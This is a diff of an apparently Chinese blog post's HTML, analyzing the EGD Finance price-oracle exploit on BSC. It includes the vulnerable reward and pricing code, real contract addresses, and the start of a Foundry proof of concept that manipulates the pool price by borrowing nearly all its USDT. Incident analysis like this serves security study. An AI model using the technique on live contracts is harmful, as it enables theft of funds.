+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -217,15 +236,15 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">claimAllReward</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">				 <span class="c1">// 判断是否有质押
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="n">userInfo</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">userStakeList</span><span class="p">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;no stake&#39;</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">userInfo</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">userStakeList</span><span class="p">.</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;no stake&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">// 判断是否在黑名单
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">black</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">],</span><span class="s">&#39;black&#39;</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">black</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">],</span><span class="s">&#39;black&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">uint</span><span class="p">[]</span> <span class="k">storage</span> <span class="n">list</span> <span class="o">=</span> <span class="n">userInfo</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">userStakeList</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">rew</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">outAmount</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">range</span> <span class="o">=</span> <span class="n">list</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//计算奖励数量
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">range</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">range</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">            <span class="n">UserSlot</span> <span class="k">storage</span> <span class="n">info</span> <span class="o">=</span> <span class="n">userSlot</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">][</span><span class="n">list</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="n">outAmount</span><span class="p">]];</span>
 </span></span><span class="line"><span class="cl">            <span class="nb">require</span><span class="p">(</span><span class="n">info</span><span class="p">.</span><span class="n">totalQuota</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;wrong index&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">            <span class="kt">uint</span> <span class="n">quota</span> <span class="o">=</span> <span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">-</span> <span class="n">info</span><span class="p">.</span><span class="n">claimTime</span><span class="p">)</span> <span class="o">*</span> <span class="n">info</span><span class="p">.</span><span class="n">rates</span><span class="p">;</span>
@@ -233,8 +252,8 @@
 </span></span><span class="line"><span class="cl">                <span class="n">quota</span> <span class="o">=</span> <span class="n">info</span><span class="p">.</span><span class="n">leftQuota</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">            <span class="p">}</span>
 </span></span><span class="line"><span class="cl">            <span class="c1">//获取当前EGD的价格,并确定发放EDG数量
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">//EGD越便宜, 获得的EGD数量就越多
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">rew</span> <span class="o">+=</span> <span class="n">quota</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span> <span class="o">/</span> <span class="n">getEGDPrice</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl">            <span class="c1">//EGD越便宜, 获得的EGD数量就越多
+</span></span></span><span class="line"><span class="cl">            <span class="n">rew</span> <span class="o">+=</span> <span class="n">quota</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span> <span class="o">/</span> <span class="n">getEGDPrice</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">.</span><span class="n">claimTime</span> <span class="o">=</span> <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">.</span><span class="n">leftQuota</span> <span class="o">-=</span> <span class="n">quota</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">            <span class="n">info</span><span class="p">.</span><span class="n">claimedQuota</span> <span class="o">+=</span> <span class="n">quota</span><span class="p">;</span>
@@ -247,18 +266,20 @@
 </span></span><span class="line"><span class="cl">            <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="p">}</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//更新质押列表
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">userInfo</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">userStakeList</span> <span class="o">=</span> <span class="n">list</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">userInfo</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">userStakeList</span> <span class="o">=</span> <span class="n">list</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//发送奖励
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">EGD</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">rew</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">EGD</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">rew</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="n">userInfo</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="n">totalClaimed</span> <span class="o">+=</span> <span class="n">rew</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Claim</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span><span class="n">rew</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
-</div><h3 id="漏洞代码">漏洞代码</h3>
-<p>采用了如下函数计算EGD token价格</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+</div><h3 class="heading-element" id="漏洞代码"><span>漏洞代码</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e4%bb%a3%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>采用了如下函数计算EGD token价格</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -270,12 +291,11 @@
 </span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">balance1</span> <span class="o">=</span> <span class="n">EGD</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">pair</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">balance2</span> <span class="o">=</span> <span class="n">U</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">pair</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="n">balance2</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span> <span class="o">/</span> <span class="n">balance1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>其中 <code>address public pair</code>是在初始化函数中赋值的:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -307,13 +327,12 @@
 </span></span><span class="line"><span class="cl">        <span class="n">U</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="mh">0x55d398326f99059fF775485246999027B3197955</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="n">router</span> <span class="o">=</span> <span class="n">IPancakeRouter02</span><span class="p">(</span><span class="mh">0x10ED43C718714eb63d5aA57B78B54704E256024E</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="n">pair</span> <span class="o">=</span> <span class="n">IPancakeFactory</span><span class="p">(</span><span class="n">router</span><span class="p">.</span><span class="n">factory</span><span class="p">()).</span><span class="n">getPair</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD</span><span class="p">),</span><span class="kt">address</span><span class="p">(</span><span class="n">U</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
-</div><p>可以在 <a href="https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#readProxyContract" target="_blank" rel="noopener noreffer ">代理合约</a> 的 Read as Proxy 中点击 pair得到, 其值为 <code>0xa361433E409Adac1f87CDF133127585F8a93c67d</code></p>
+</div><p>可以在 <a href="https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#readProxyContract" target="_blank" rel="external nofollow noopener noreferrer">代理合约</a> 的 Read as Proxy 中点击 pair得到, 其值为 <code>0xa361433E409Adac1f87CDF133127585F8a93c67d</code></p>
 <p>或者通过 下面的命令行得到</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -321,16 +340,15 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> &gt; anvil -f https://rpc.ankr.com/bsc   --fork-block-number 20245522
 </span></span><span class="line"><span class="cl"> &gt; cast call 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370 &#34;pair()&#34;
-</span></span><span class="line"><span class="cl"> //0x000000000000000000000000a361433e409adac1f87cdf133127585f8a93c67d
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"> //0x000000000000000000000000a361433e409adac1f87cdf133127585f8a93c67d</span></span></code></pre></td></tr></table></div>
 </div>
-</div><p>在区块链浏览器中可以看到该地址是<a href="https://bscscan.com/token/0xa361433e409adac1f87cdf133127585f8a93c67d" target="_blank" rel="noopener noreffer ">Pancake LPs (Cake-LP)</a>  (Pancake流动性提供商)</p>
+</div><p>在区块链浏览器中可以看到该地址是<a href="https://bscscan.com/token/0xa361433e409adac1f87cdf133127585f8a93c67d" target="_blank" rel="external nofollow noopener noreferrer">Pancake LPs (Cake-LP)</a>  (Pancake流动性提供商)</p>
 <p>也就是说 <code>getEGDPrice()</code>是根据地址0xa361433E409Adac1f87CDF133127585F8a93c67d上的EGD token数量和USDT的数量 (也就是流动性)进行价格计算的.</p>
 <p>当USDT数量远远多于EDG数量时, EDG就能兑换更多的USDT, 也就是EDG更昂贵</p>
 <p>相反, 当USDT数量很少时, EDG就兑换更少的USDT, 也就是EDG更便宜.</p>
-<p>但我们知道在该<a href="https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#code" target="_blank" rel="noopener noreffer ">Pancke Swap LPs</a> 提供了<code>swap</code>函数进行借贷操作,  我们可以大量借出USDT, 让EDG变得非常便宜, 那么根据下面的代码, 用户获得的用于奖励的EDG的数量就非常多.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<p>但我们知道在该<a href="https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d#code" target="_blank" rel="external nofollow noopener noreferrer">Pancke Swap LPs</a> 提供了<code>swap</code>函数进行借贷操作,  我们可以大量借出USDT, 让EDG变得非常便宜, 那么根据下面的代码, 用户获得的用于奖励的EDG的数量就非常多.</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
@@ -338,13 +356,18 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">//获取当前EGD的价格,并确定发放EDG数量
 </span></span></span><span class="line"><span class="cl"><span class="c1">//EGD越便宜, 获得的EGD数量就越多
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">rew</span> <span class="o">+=</span> <span class="n">quota</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span> <span class="o">/</span> <span class="n">getEGDPrice</span><span class="p">();</span>
-</span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="n">rew</span> <span class="o">+=</span> <span class="n">quota</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e18</span> <span class="o">/</span> <span class="n">getEGDPrice</span><span class="p">();</span></span></span></code></pre></td></tr></table></div>
 </div>
-</div><h2 id="攻击过程">攻击过程</h2>
-<h3 id="操纵egdusdt的价格-让egd非常便宜">操纵EGD/USDT的价格, 让EGD非常便宜</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+</div><h2 class="heading-element" id="攻击过程"><span>攻击过程</span>
+  <a href="#%e6%94%bb%e5%87%bb%e8%bf%87%e7%a8%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="操纵egdusdt的价格-让egd非常便宜"><span>操纵EGD/USDT的价格, 让EGD非常便宜</span>
+  <a href="#%e6%93%8d%e7%ba%b5egdusdt%e7%9a%84%e4%bb%b7%e6%a0%bc-%e8%ae%a9egd%e9%9d%9e%e5%b8%b8%e4%be%bf%e5%ae%9c" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -428,7 +451,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/test.sol&#34;</span><span class="p">;</span>
@@ -453,14 +476,14 @@
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">//BSC_USDT合约地址
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">address</span> <span class="k">constant</span> <span class="n">usdt</span> <span class="o">=</span> <span class="mh">0x55d398326f99059fF775485246999027B3197955</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">constant</span> <span class="n">usdt</span> <span class="o">=</span> <span class="mh">0x55d398326f99059fF775485246999027B3197955</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">//EGD_Finance合约地址
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">address</span> <span class="k">constant</span> <span class="n">EGD_Finance</span> <span class="o">=</span> <span class="mh">0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">constant</span> <span class="n">EGD_Finance</span> <span class="o">=</span> <span class="mh">0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="c1">//攻击发生前的区块高度
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint256</span> <span class="k">constant</span> <span class="n">blockheight</span> <span class="o">=</span> <span class="mi">20245522</span><span class="p">;</span>
+</span></span></span><span class="line"><span class="cl"><span class="kt">uint256</span> <span class="k">constant</span> <span class="n">blockheight</span> <span class="o">=</span> <span class="mi">20245522</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1">//LPs
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">IPancakePair</span> <span class="k">constant</span> <span class="n">EGD_USDT_LPPool</span> <span class="o">=</span> <span class="n">IPancakePair</span><span class="p">(</span>
+</span></span></span><span class="line"><span class="cl"><span class="n">IPancakePair</span> <span class="k">constant</span> <span class="n">EGD_USDT_LPPool</span> <span class="o">=</span> <span class="n">IPancakePair</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">    <span class="mh">0xa361433E409Adac1f87CDF133127585F8a93c67d</span>
 </span></span><span class="line"><span class="cl"><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
@@ -469,17 +492,17 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    		<span class="c1">//fork 攻击发生前的网络
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="s">&#34;https://rpc.ankr.com/bsc&#34;</span><span class="p">,</span> <span class="n">blockheight</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="s">&#34;https://rpc.ankr.com/bsc&#34;</span><span class="p">,</span> <span class="n">blockheight</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="n">egdFinance</span> <span class="o">=</span> <span class="n">IEGD_Finance</span><span class="p">(</span><span class="n">EGD_Finance</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//假设我们的账户上有一些USDT
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">deal</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">usdt</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">30000</span> <span class="o">*</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">deal</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">usdt</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">30000</span> <span class="o">*</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">testPrice</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;edg price before:&#34;</span><span class="p">,</span> <span class="n">egdFinance</span><span class="p">.</span><span class="n">getEGDPrice</span><span class="p">());</span>
 </span></span><span class="line"><span class="cl">				
 </span></span><span class="line"><span class="cl">				<span class="c1">//借出99.99%的USDT, 让USDT变得非常稀少
